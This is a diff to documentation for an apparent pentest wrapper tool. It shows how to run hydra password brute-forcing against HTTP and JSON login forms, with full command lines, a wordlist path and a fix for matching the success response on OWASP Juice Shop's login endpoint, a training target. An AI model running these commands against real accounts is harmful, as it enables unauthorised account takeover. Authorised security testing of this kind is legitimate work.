@@ -11,12 +11,17 @@ Run — the target is the **host**; the service, form spec and login/password li
 after `--`:
 
     searu run hydra --technique T1110 --target host -- -s 443 -l admin \
-      -P seclists:Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
+      -P seclists:Passwords/Common-Credentials/Pwdb_top-10000.txt \
       http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials'
 
-For a JSON API, put the body as JSON and add the content-type header, e.g.
-`http-post-form '/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:Invalid email or password'`
-(escape colons inside the body/header with `\:`; the fail-string condition goes last). Read results:
+The last field is the condition. Use `F=<text>` (fail-string) only when a failed login returns 200 with
+that text in the body. A JSON/REST login usually answers a failure with 401/403, and hydra treats any
+non-2xx as a hard error and never checks the fail-string — so a fail-string silently matches nothing.
+For those, match the **success** response instead with `S=<text>` (a string present only on success, e.g.
+a token field). Juice Shop's `/rest/user/login` is exactly this case:
+
+`http-post-form '/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:S=authentication'`
+(escape colons inside the body/header with `\:`; the `S=`/`F=` condition goes last). Read results:
 
     searu findings --tool hydra     # a weak-credentials finding per cracked account
     searu loot --reveal             # the cracked passwords (stored as loot, never in the finding)
